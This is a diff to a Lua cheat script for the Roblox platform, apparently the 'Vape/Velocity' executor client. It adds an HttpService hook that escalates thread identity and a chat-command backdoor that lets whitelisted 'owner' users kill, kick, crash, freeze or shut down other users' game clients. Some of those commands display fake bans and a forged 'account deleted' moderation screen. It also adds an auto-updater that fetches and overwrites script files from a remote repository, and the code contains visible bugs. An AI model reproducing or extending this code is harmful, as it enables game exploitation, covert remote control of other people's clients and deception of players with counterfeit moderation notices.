@@ -1,4 +1,5 @@
 --This watermark is used to delete the file if its cached, remove it to make the file persist after commits.
+local ver = 'v.0'
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
@@ -12,6 +13,11 @@ local gameCamera = workspace.CurrentCamera
 local lplr = playersService.LocalPlayer
 local vapeConnections = {}
 local vapeCachedAssets = {}
+local clonefunc = (clonefunction or clonefunc or function(func) return func end)
+local identity = (getidentity or syn and syn.getidentity or function() return 2 end)
+local httpService = game:GetService('HttpService')
+local setidentity = (setthreadcaps or syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity or function() end)
+local oldcall
 local vapeTargetInfo = shared.VapeTargetInfo
 local vapeStore = {Bindable = {}, MessageReceived = Instance.new('BindableEvent'), platform = inputService:GetPlatform()}
 getgenv().vapeStore = vapeStore
@@ -23,6 +29,7 @@ local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
 	return suc and res ~= nil
 end
+local httprequest = (http and http.request or http_request or fluxus and fluxus.request or syn and syn.request or request)
 local networkownerswitch = tick()
 local isnetworkowner = isnetworkowner or function(part)
 	local suc, res = pcall(function() return gethiddenproperty(part, "NetworkOwnershipRule") end)
@@ -50,6 +57,19 @@ local worldtoviewportpoint = function(pos)
 	end
 	return gameCamera.WorldToViewportPoint(gameCamera, pos)
 end
+
+if hookmetamethod then
+     oldcall = hookmetamethod(game, '__namecall', function(self, ...) 
+         if shared.VapeExecuted and self == httpService then 
+             local oldidentity = identity()
+             setidentity(8)
+             local res = oldcall(self, ...)
+             setidentity(oldidentity)
+             return res
+         end
+         return oldcall(self, ...)
+     end)
+ end
 
 local function vapeGithubRequest(scripturl)
 	if not isfile("vape/"..scripturl) then
@@ -260,26 +280,6 @@ local function EntityNearPosition(distance, checktab)
 	end
 end
 
-task.spawn(function()
-	local function chatfunc(plr)
-		table.insert(vapeConnections, plr.Chatted:Connect(function(message)
-			vapeStore.MessageReceived:Fire(plr, message)
-		end))
-	end
-	table.insert(vapeConnections, textChatService.MessageReceived:Connect(function(data)
-		local success, player = pcall(function() 
-			return playersService:GetPlayerByUserId(data.TextSource.UserId) 
-		end)
-		if success then 
-			vapeStore.MessageReceived:Fire(player, data.Text)
-		end
-	end))
-	for i,v in playersService:GetPlayers() do 
-		chatfunc(v)
-	end
-	table.insert(vapeConnections, playersService.PlayerAdded:Connect(chatfunc))
-end)
-
 sendmessage = function(text)
 	if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync(text)
@@ -450,9 +450,9 @@ task.spawn(function()
 	function WhitelistFunctions:CreatePlayerTag(plr, text, color)
         WhitelistFunctions.playerTags = WhitelistFunctions.playerTags or {}
         local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)
-		local newtag = WhitelistFunctions.CustomTags[plr.Name] or ""	
-		local tag = WhitelistFunctions:GrabTagText(plr)
-		local c = WhitelistFunctions:GrabTagColor(plr)
+	local newtag = WhitelistFunctions.CustomTags[plr.Name] or ""	
+	local tag = WhitelistFunctions:GrabTagText(plr)
+	local c = WhitelistFunctions:GrabTagColor(plr)
         local tagText = ""
         local tagColor = color or ""
 	
@@ -472,13 +472,24 @@ task.spawn(function()
             end
         end
         WhitelistFunctions.playerTags[plr] = {
-            Text = tagText,
-            Color = tagColor
+                Text = tagText,
+                Color = tagColor
         }
         pcall(function() shared.vapeentity.fullEntityRefresh() end)
         return WhitelistFunctions.playerTags[plr]
     end
-
+    
+    function WhitelistFunctions:CheckPlayerType(plr)
+        local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)
+        if plrPriority == 0 then
+           return 'DEFAULT'
+        elseif plrPriority == 1 then
+           return 'VAPE PRIVATE'
+        elseif plrPriority == 2 then
+           return 'VAPE OWNER'
+        end
+    end
+  
 	function WhitelistFunctions:IsSpecialIngame()
 		for i,v in pairs(playersService:GetPlayers()) do 
 			if WhitelistFunctions:CheckWhitelisted(v) then 
@@ -487,17 +498,8 @@ task.spawn(function()
 		end
 		return false
 	end
-	function WhitelistFunctions:CheckPlayerType(plr)
-        local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)
-        if plrPriority == 0 then
-            return 'DEFAULT'
-        elseif plrPriority == 1 then
-            return 'VAPE PRIVATE'
-        elseif plrPriority == 2 then
-            return 'VAPE OWNER'
-        end
-    end
 end
+
 shared.vapewhitelist = WhitelistFunctions
 
 task.spawn(function()
@@ -525,7 +527,10 @@ local function renderNametag(plr)
         return
     end
     if WhitelistFunctions.LocalPriority >= 1 then
-        local plr = game.Players.LocalPlayer	
+        local plr = game.Players.LocalPlayer
+        if WhitelistFunctions.playerTags[plr] == nil then 
+	        WhitelistFunctions:CreatePlayerTag(plr, 'VELOCITY PRIVATE', '#800080') 
+	    end	
         local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
         if playerlist then
             pcall(function()
@@ -560,9 +565,7 @@ local function renderNametag(plr)
 end
 
 task.spawn(function()
-    repeat
-        task.wait()
-    until WhitelistFunctions.Loaded
+    repeat task.wait() until WhitelistFunctions.Loaded
     for _, player in pairs(game.Players:GetPlayers()) do
         if WhitelistFunctions.LocalPriority >= 1 then
             renderNametag(player)
@@ -5770,45 +5773,6 @@ runFunction(function()
 end)
 
 runFunction(function()
-	local InfiniteJump = {Enabled = false}
-	local InfiniteJumpHold = {Enabled = false}
-	InfiniteJump = GuiLibrary.ObjectsThatCanBeSaved.VelocityWindow.Api.CreateOptionsButton({
-		Name = 'InfiniteJump',
-		HoverText = 'Jump without touching the ground',
-		Function = function(callback)
-			if callback then
-				local held = false
-				table.insert(InfiniteJump.Connections, inputService.InputBegan:Connect(function(input)
-					if input.KeyCode == Enum.KeyCode.Space and not inputService:GetFocusedTextBox() then
-						held = true
-						if entityLibrary.isAlive then
-							if InfiniteJumpHold.Enabled then
-								repeat
-									entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-									task.wait()
-								until not held or not InfiniteJump.Enabled or not InfiniteJumpHold.Enabled or inputService:GetFocusedTextBox()
-							else
-								entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-							end
-						end
-					end
-				end))
-				table.insert(InfiniteJump.Connections, inputService.InputEnded:Connect(function(input)
-					if input.KeyCode == Enum.KeyCode.Space and not inputService:GetFocusedTextBox() then
-						held = false
-					end
-				end))
-			end
-		end
-	})
-	InfiniteJumpHold = InfiniteJump.CreateToggle({
-		Name = 'Hold',
-		Function = function() end,
-		HoverText = 'Hold down space to jump'
-	})
-end)	
-
-runFunction(function()
 	local Atmosphere = {Enabled = false}
 	local SkyUp = {Value = ""}
 	local SkyDown = {Value = ""}
@@ -5945,69 +5909,601 @@ runFunction(function()
 	})
 end)
 
-textChatService.OnIncomingMessage = function(message) 
-	local properties = Instance.new('TextChatMessageProperties')
-	if message.TextSource then 
-		local player = playersService:GetPlayerByUserId(message.TextSource.UserId) 
-		local vapetag = (player and WhitelistFunctions.playerTags[player])
-		if vapetag and WhitelistFunctions.LocalPriority > 0 then 
-			properties.PrefixText = "<font color='#"..vapetag.Color.."'>["..vapetag.Text.."] </font> " ..message.PrefixText or message.PrefixText
-		end
-        end
-	return properties
-end
+task.spawn(function()
+    local priolist = {
+        DEFAULT = 0,
+        ["VAPE PRIVATE"] = 1,
+        ["VAPE OWNER"] = 2
+    }
 
-if replicatedStorageService:FindFirstChild('DefaultChatSystemChatEvents') then 
-	local chatTables = {}
-	local oldchatfunc
-	for i,v in next, getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do 
-		if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == 'table' then
-			local chatvalues = getmetatable(debug.getupvalues(v.Function)[1]) 
-			if chatvalues and chatvalues.GetChannel then  
-				oldchatfunc = chatvalues.GetChannel 
-				chatvalues.GetChannel = function(self, name) 
-					local data = oldchatfunc(self, name) 
-					local addmessage = (data and data.AddMessageToChannel)
-					if data and data.AddMessageToChannel then 
-						if chatTables[data] == nil then 
-							chatTables[data] = data.AddMessageToChannel 
-						end 
-						data.AddMessageToChannel = function(self2, data2)
-							local plr = playersService:FindFirstChild(data2.FromSpeaker)
-							local vapetag = (plr and WhitelistFunctions.playerTags[plr])
-							if data2.FromSpeaker and vapetag and vapeInjected then 
-								local tagcolor = Color3.fromHex(vapetag.Color)
-								data2.ExtraData = {
-									Tags = {unpack(data2.ExtraData.Tags), {TagText = vapetag.Text, TagColor = tagcolor}},
-									NameColor = plr.Team == nil and Color3.fromRGB(tagcolor.R + 45, tagcolor.G + 45, tagcolor.B - 10) or plr.TeamColor.Color
-								}																																																																																																																																																																			
-							end
-							return addmessage(self2, data2)
+    local function findplayers(arg, plr)
+        local temp = {}
+        local continuechecking = true
+        if arg == "default" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" then table.insert(temp, lplr) continuechecking = false end
+        if arg == "teamdefault" and continuechecking and WhitelistFunctions:CheckPlayerType(lplr) == "DEFAULT" and plr and lplr:GetAttribute("Team") ~= plr:GetAttribute("Team") then table.insert(temp, lplr) continuechecking = false end
+        if arg == "private" and continuechecking and (WhitelistFunctions:CheckPlayerType(lplr) == "VAPE PRIVATE" or WhitelistFunctions:CheckPlayerType(lplr) == "VAPE OWNER") then table.insert(temp, lplr) continuechecking = false end
+        for i,v in pairs(playersService:GetPlayers()) do if continuechecking and v.Name:lower():sub(1, arg:len()) == arg:lower() then table.insert(temp, v) continuechecking = false end end
+        return temp
+    end
+
+    local function transformImage(img, txt)
+        local function funnyfunc(v)
+            if v:GetFullName():find("ExperienceChat") == nil then
+                if v:IsA("ImageLabel") or v:IsA("ImageButton") then
+                    v.Image = img
+                    v:GetPropertyChangedSignal("Image"):Connect(function()
+                        v.Image = img
+                    end)
+                end
+                if v:IsA("TextLabel") or v:IsA("TextButton") then
+                    if v.Text ~= "" then
+                        v.Text = txt
+                    end
+                    v:GetPropertyChangedSignal("Text"):Connect(function()
+                        if v.Text ~= "" then
+                            v.Text = txt
+                        end
+                    end)
+                end
+                if v:IsA("Texture") or v:IsA("Decal") then
+                    v.Texture = img
+                    v:GetPropertyChangedSignal("Texture"):Connect(function()
+                        v.Texture = img
+                    end)
+                end
+                if v:IsA("MeshPart") then
+                    v.TextureID = img
+                    v:GetPropertyChangedSignal("TextureID"):Connect(function()
+                        v.TextureID = img
+                    end)
+                end
+                if v:IsA("SpecialMesh") then
+                    v.TextureId = img
+                    v:GetPropertyChangedSignal("TextureId"):Connect(function()
+                        v.TextureId = img
+                    end)
+                end
+                if v:IsA("Sky") then
+                    v.SkyboxBk = img
+                    v.SkyboxDn = img
+                    v.SkyboxFt = img
+                    v.SkyboxLf = img
+                    v.SkyboxRt = img
+                    v.SkyboxUp = img
+                end
+            end
+        end
+
+        for i, v in pairs(game:GetDescendants()) do
+            funnyfunc(v)
+        end
+        game.DescendantAdded:Connect(funnyfunc)
+    end
+
+    local vapePrivateCommands = {
+		kill = function(args, plr)
+			if entityLibrary.isAlive then
+				local hum = entityLibrary.character.Humanoid
+				task.delay(0.1, function()
+					if hum and hum.Health > 0 then 
+						hum:ChangeState(Enum.HumanoidStateType.Dead)
+						hum.Health = 0
+					end
+				end)
+			end
+		end,
+        murder = function(args, plr)
+            lplr.Character.Humanoid:TakeDamage(lplr.Character.Humanoid.Health)
+	     	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
+        end,
+        black = function(args)
+            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
+                local character = player.Character
+                if character then
+                    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+                    if humanoidRootPart and humanoidRootPart:IsA('BasePart') then
+                        humanoidRootPart.BrickColor = BrickColor.new("Really black")
+                    end
+                end
+            end
+        end,
+        troll = function(args)
+            task.spawn(function()
+                transformImage("http://www.roblox.com/asset/?id=13953598788", "xylex")
+                task.wait(6)
+                lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+            end)
+        end,
+		byfron = function(args, plr)
+			task.spawn(function()
+				local UIBlox = getrenv().require(game:GetService("CorePackages").UIBlox)
+				local Roact = getrenv().require(game:GetService("CorePackages").Roact)
+				UIBlox.init(getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppUIBloxConfig))
+				local auth = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
+				local darktheme = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Themes.DarkTheme
+				local gotham = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Style).Fonts.Gotham
+				local tLocalization = getrenv().require(game:GetService("CorePackages").Workspace.Packages.RobloxAppLocales).Localization;
+				local a = getrenv().require(game:GetService("CorePackages").Workspace.Packages.Localization).LocalizationProvider
+				lplr.PlayerGui:ClearAllChildren()
+				GuiLibrary.MainGui.Enabled = false
+				game:GetService("CoreGui"):ClearAllChildren()
+				for i,v in pairs(workspace:GetChildren()) do pcall(function() v:Destroy() end) end
+				task.wait(0.2)
+				lplr:Kick()
+				game:GetService("GuiService"):ClearError()
+				task.wait(2)
+				local gui = Instance.new("ScreenGui")
+				gui.IgnoreGuiInset = true
+				gui.Parent = game:GetService("CoreGui")
+				local frame = Instance.new("Frame")
+				frame.BorderSizePixel = 0
+				frame.Size = UDim2.new(1, 0, 1, 0)
+				frame.BackgroundColor3 = Color3.new(1, 1, 1)
+				frame.Parent = gui
+				task.delay(0.1, function()
+					frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+				end)
+				task.delay(2, function()
+					local e = Roact.createElement(auth, {
+						style = {},
+						screenSize = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1920, 1080),
+						moderationDetails = {
+							punishmentTypeDescription = "Delete",
+							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
+							reactivateAccountActivated = true,
+							badUtterances = {},
+							messageToUser = "Your account has been deleted for violating our Terms of Use for exploiting."
+						},
+						termsActivated = function() 
+							game:Shutdown()
+						end,
+						communityGuidelinesActivated = function() 
+							game:Shutdown()
+						end,
+						supportFormActivated = function() 
+							game:Shutdown()
+						end,
+						reactivateAccountActivated = function() 
+							game:Shutdown()
+						end,
+						logoutCallback = function()
+							game:Shutdown()
+						end,
+						globalGuiInset = {
+							top = 0
+						}
+					})
+					local screengui = Roact.createElement("ScreenGui", {}, Roact.createElement(a, {
+							localization = tLocalization.mock()
+						}, {Roact.createElement(UIBlox.Style.Provider, {
+								style = {
+									Theme = darktheme,
+									Font = gotham
+								},
+							}, {e})}))
+					Roact.mount(screengui, game:GetService("CoreGui"))
+				end)
+			end)
+		end,
+		--lobby = function(args)
+			--bedwars.ClientHandler:Get("TeleportToLobby"):SendToServer()
+		--end,
+		reveal = function(args)
+			task.spawn(function()
+				task.wait(0.1)
+                local said = false
+				if WhitelistFunctions.LocalPriority == 0 and not said then 
+					sendmessage("helloimusinginhaler")
+				end
+			end)
+		end,
+		lagback = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.Velocity = Vector3.new(9999999, 9999999, 9999999)
+			end
+		end,
+		jump = function(args)
+			if entityLibrary.isAlive and entityLibrary.character.Humanoid.FloorMaterial ~= Enum.Material.Air then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+			end
+		end,
+		trip = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid:ChangeState(Enum.HumanoidStateType.Physics)
+			end
+		end,
+		teleport = function(args)
+			game:GetService("TeleportService"):Teleport(tonumber(args[1]) ~= "" and tonumber(args[1]) or game.PlaceId)
+		end,
+		sit = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = true
+			end
+		end,
+		unsit = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.Humanoid.Sit = false
+			end
+		end,
+		freeze = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.Anchored = true
+			end
+		end,
+        thaw = function(args)
+            if entityLibrary.isAlive then
+                entityLibrary.character.HumanoidRootPart.Anchored = false
+            end
+        end,
+		deletemap = function(args)
+			for i,v in pairs(collectionService:GetTagged("block")) do
+				v:Destroy()
+			end
+		end,
+		void = function(args)
+			if entityLibrary.isAlive then
+				entityLibrary.character.HumanoidRootPart.CFrame = entityLibrary.character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
+			end
+		end,
+		framerate = function(args)
+			if #args >= 1 then
+				if setfpscap then
+					setfpscap(tonumber(args[1]) ~= "" and math.clamp(tonumber(args[1]) or 9999, 1, 9999) or 9999)
+				end
+			end
+		end,
+		crash = function(args)
+			setfpscap(9e9)
+			print(game:GetObjects("h29g3535")[1])
+		end,
+		chipman = function(args)
+			transformImage("http://www.roblox.com/asset/?id=6864086702", "chip man")
+		end,
+		rickroll = function(args)
+			transformImage("http://www.roblox.com/asset/?id=7083449168", "Never gonna give you up")
+		end,
+		josiah = function(args)
+			transformImage("http://www.roblox.com/asset/?id=13924242802", "josiah boney")
+		end,
+        xylex = function(args)
+            transformImage("http://www.roblox.com/asset/?id=13953598788", "byelex")
+        end,
+        gravity = function(args)
+            workspace.Gravity = tonumber(args[1]) or 192.6
+        end,
+        kick = function(args, plr)
+            local str = ""
+            for i,v in pairs(args) do
+                str = str..v..(i > 1 and " " or "")
+            end
+            task.spawn(function()
+                lplr:Kick(str)
+            end)
+        end,
+        ban = function(args)
+            task.spawn(function()
+                task.wait(3)
+                lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+            end)
+        end,
+		uninject = function(args)
+			GuiLibrary.SelfDestruct()
+		end,
+		enable = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" and not v.Api.Enabled then
+							v.Api.ToggleButton()
 						end
-						return data
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module and not module.Api.Enabled then
+						module.Api.ToggleButton()
 					end
 				end
 			end
+		end,
+		disable = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" and v.Api.Enabled then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module and module.Api.Enabled then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		toggle = function(args)
+			if #args >= 1 then
+				if args[1]:lower() == "all" then
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i ~= "Panic" then
+							v.Api.ToggleButton()
+						end
+					end
+				else
+					local module
+					for i,v in pairs(GuiLibrary.ObjectsThatCanBeSaved) do 
+						if v.Type == "OptionsButton" and i:lower() == args[1]:lower().."optionsbutton" then
+							module = v
+							break
+						end
+					end
+					if module then
+						module.Api.ToggleButton()
+					end
+				end
+			end
+		end,
+		shutdown = function(args)
+			game:Shutdown()
 		end
-	end
+    }
+    vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
+    task.spawn(function()
+	    local function chatfunc(plr)
+		    table.insert(vapeConnections, plr.Chatted:Connect(function(message)
+			    vapeStore.MessageReceived:Fire(plr, message)
+		    end))
+	    end
+	    table.insert(vapeConnections, textChatService.MessageReceived:Connect(function(data)
+		    local success, player = pcall(function() 
+			    return playersService:GetPlayerByUserId(data.TextSource.UserId) 
+		    end)
+		    if success then 
+			    vapeStore.MessageReceived:Fire(player, data.Text)
+		    end
+	    end))
+	    for i,v in playersService:GetPlayers() do 
+		    chatfunc(v)
+	    end
+	    table.insert(vapeConnections, playersService.PlayerAdded:Connect(chatfunc))
+    end)
+    table.insert(vapeConnections, vapeStore.MessageReceived.Event:Connect(function(plr, message)
+        message = message:gsub('/w '..lplr.Name, '')
+        local localPriority = priolist[WhitelistFunctions:CheckPlayerType(lplr)] or 0
+        local otherPriority = priolist[WhitelistFunctions:CheckPlayerType(plr)] or 0
+        local args = message:split(' ')
+        local first, second = tostring(args[1]), tostring(args[2])
+        if plr.Name == lplr.Name then
+            if localPriority > 0 then
+                if message == "ehelp" or first:sub(1, 6) == ';cmds' then
+                    task.wait(0.1)
+                    local tab = {}
+                    for i,v in pairs(vapePrivateCommands) do
+                        table.insert(tab, ";"..i)
+                    end
+                    table.sort(tab)
+                    local str = table.concat(tab, "\n")
+                    if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then 
+                        textChatService.ChatInputBarConfiguration.TargetTextChannel:DisplaySystemMessage(str)
+                    else 
+                        game:GetService('StarterGui'):SetCore('ChatMakeSystemMessage', {Text = str, Color = Color3.fromRGB(255, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24})
+                        game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[Velocity Private] Commands", Color = Color3.fromRGB(0, 255, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
+                    end
+                end
+            end
+        else
+            if otherPriority > 0 and otherPriority > localPriority and #args > 1 then
+                table.remove(args, 1)
+                local chosenplayers = findplayers(args[1], plr)
+                if table.find(chosenplayers, lplr) then
+                    table.remove(args, 1)
+                    for i,v in pairs(chosenplayers) do
+                        for i,v in pairs(vapePrivateCommands) do
+                            if message:len() >= (i:len() + 1) and message:sub(1, i:len() + 1):lower() == ";"..i:lower() then 
+                                v(args, plr)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+		local function newPlayer(plr)
+			if WhitelistFunctions:GetWhitelist(plr) ~= 0 and WhitelistFunctions.LocalPriority == 0 then
+				GuiLibrary.SelfDestruct = function()
+					warningNotification("Vape", "nice one bro :troll:", 5)
+				end
+				task.spawn(function()
+					lplr:Kick("You have been temporarily banned. [Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds ]")
+					task.wait(4)
+				end)
+			end
+		end
+        if message:find('helloimusinginhaler') and localPriority > 0 then
+            if WhitelistFunctions:GetWhitelist(lplr) and WhitelistFunctions:GetWhitelist(lplr) >= 1 then
+                warningNotification('Vape', plr.Name..' is using Vape!', 30)
+                WhitelistFunctions.CustomTags[plr.Name] = "[VAPE USER]"                                                                               local ind, newent = entityLibrary.getEntityFromPlayer(plr)
+				if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
+            end
+            local nonWhitelistedVapeTag = "VAPE USER"
+            local nonWhitelistedVapeColor = "#FFFF00" 
+            properties.PrefixText = "<font color='" .. nonWhitelistedVapeColor .. "'>[" .. nonWhitelistedVapeTag .. "] </font> " .. (message.PrefixText or "")
+        end
+    end))
+end)
+
+textChatService.OnIncomingMessage = function(message)
+    local properties = Instance.new('TextChatMessageProperties') 
+    if message.TextSource then
+        local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
+        if plr then
+            local senderIsWhitelisted = WhitelistFunctions:CheckWhitelisted(plr)
+            if senderIsWhitelisted then
+                for _, player in ipairs(playersService:GetPlayers()) do
+                    local vapeTag = WhitelistFunctions.playerTags[player]
+                    if vapeTag then
+                        local Priority = WhitelistFunctions:CheckPlayerType(player)
+                        if Priority and Priority ~= "DEFAULT" then
+                            properties.PrefixText = "<font color='#" .. vapeTag.Color .. "'>[" .. vapeTag.Text .. "] </font> " .. (message.PrefixText or "")
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return properties
+end
+
+
+if replicatedStorageService:FindFirstChild('DefaultChatSystemChatEvents') then 
+    local chatTables = {}
+    local oldchatfunc
+    for i,v in next, getconnections(replicatedStorageService.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do 
+        if v.Function and #debug.getupvalues(v.Function) > 0 and type(debug.getupvalues(v.Function)[1]) == 'table' then
+            local chatvalues = getmetatable(debug.getupvalues(v.Function)[1]) 
+            if chatvalues and chatvalues.GetChannel then  
+                oldchatfunc = chatvalues.GetChannel 
+                chatvalues.GetChannel = function(self, name) 
+                    local data = oldchatfunc(self, name) 
+                    local addmessage = (data and data.AddMessageToChannel)
+                    if data and data.AddMessageToChannel then 
+                        if chatTables[data] == nil then 
+                            chatTables[data] = data.AddMessageToChannel 
+                        end 
+                        data.AddMessageToChannel = function(self2, data2)
+                            local plr = playersService:FindFirstChild(data2.FromSpeaker)
+                            local vapetag = (plr and WhitelistFunctions.playerTags[plr])
+                            local senderIsWhitelisted = WhitelistFunctions:CheckWhitelisted(plr)
+                            if data2.FromSpeaker and vapeInjected then 
+                                local tagText, tagColor
+                                if vapetag then
+                                    tagColor = Color3.fromHex(vapetag.Color)
+                                    tagText = vapetag.Text
+                                elseif senderIsWhitelisted then
+                                    for _, player in ipairs(playersService:GetPlayers()) do
+                                        if vapeTag then
+                                            local Priority = WhitelistFunctions:CheckPlayerType(player)
+                                            if Priority and Priority ~= "DEFAULT" then
+                                                tagColor = Color3.fromRGB(255, 255, 0)
+                                                tagText = "VAPE USER"
+                                            end
+                                        end
+                                    end
+                                end
+                                if tagText then
+                                    data2.ExtraData = {
+                                        Tags = {unpack(data2.ExtraData.Tags), {TagText = tagText, TagColor = tagColor}},
+                                        NameColor = plr.Team == nil and Color3.fromRGB(tagColor.R + 45, tagColor.G + 45, tagColor.B - 10) or plr.TeamColor.Color
+                                    }
+                                end
+                            end
+                            return addmessage(self2, data2)
+                        end
+                        return data
+                    end
+                end
+            end
+        end
+    end
+end
+
+if hookmetamethod and httpServiceRun == nil then 
+    local oldcall
+    getgenv().httpServiceRun = function(func, ...) 
+        return clonefunc(httpService[func])(httpService, ...) 
+    end
+    oldcall = hookmetamethod(httpService, '__namecall', function(self, ...)
+        if self == httpService then
+            return httpServiceRun(getnamecallmethod(), ...)
+        end
+        return oldcall(self, ...)
+    end)
 end
 
 local said = false
 local sent = false  
 local function whitelistFunction(plr)
     repeat task.wait() until WhitelistFunctions.Loaded
-    local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)                                                                                                                                            
-    if WhitelistFunctions.LocalPriority >= 1 and not sent then                                                                                                                                                
-        warningNotification('Velocity', 'You are now authenticated for whitelist. Time to troll velocity users!', 4.5)
+    local plrPriority, _, _ = WhitelistFunctions:GetWhitelist(plr)                                                                    
+    if WhitelistFunctions.LocalPriority >= 1 and not sent then                                                                        
+        warningNotification('Vape', 'You are now authenticated, Time to troll velocity users!', 4.5)
         sent = true
     elseif WhitelistFunctions.LocalPriority == 0 and WhitelistFunctions:IsSpecialIngame() and not said then
         sendmessage('helloimusinginhaler')
-        said = true                                                                                                                                                     
+        said = true                                                                                                                   
     end
 end
+whitelistFunction(lplr) 
 
-whitelistFunction(lplr)
+local auto = true
+local function fetchFile(url)
+    local success, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+   return result
+end
 
+function Update()
+    local function fetchAndWrite(url, filePath)
+        local body = fetchFile(url)
+        if body then
+            writefile(filePath, body)
+        else
+            print("Failed to fetch file from URL:", url)
+        end
+    end
+    local verisonURL = "https://raw.githubusercontent.com/Copiums/Velocity/main/verison.txt"
+    local v = fetchFile(verisonURL)
+    local currentVersion = v
+    print(currentVersion)
+    local localVersion = '0'
+    if isfile('vape/version.txt') then
+        localVersion = readfile('vape/version.txt')
+    else
+        writefile('vape/version.txt', tostring(currentVersion))  
+        localVersion = currentVersion  
+    end
+    if not currentVersion then
+        return
+    end
+    function outdated()
+       if currentVerison == localVersion then
+            return false
+       else
+            return true
+       end
+   end
+   if outdated() then
+       warningNotification('Velocity', 'Script is outdated. Please wait a second...', 10)
+       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/Universal.lua', 'vape/Universal.lua')
+       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/MainScript.lua', 'vape/MainScript.lua')
+       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/GuiLibrary.lua', 'vape/GuiLibrary.lua')
+       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/6872274481.lua', 'vape/CustomModules/6872274481.lua')
+       fetchAndWrite('https://raw.githubusercontent.com/Copiums/Velocity/main/6872265039.lua', 'vape/CustomModules/6872265039.lua')
+       wait(3)
+       warningNotification('Velocity - Autoupdate', 'Success! Reinject vape..', 5)
+       writefile('vape/version.txt', tostring(currentVersion)) 
+       wait(5)
+       lplr:Kick("Update success!")
+   end
+end
+if auto then
+   Update()
+else
+    warningNotification("Velocity", "Autoupdate has been disabled. Continuing..")
+end
+                                                                                                                                                                                                                                                                                                                               
 runFunction(function()
 	local Disabler = {Enabled = false}
 	local DisablerAntiKick = {Enabled = false}
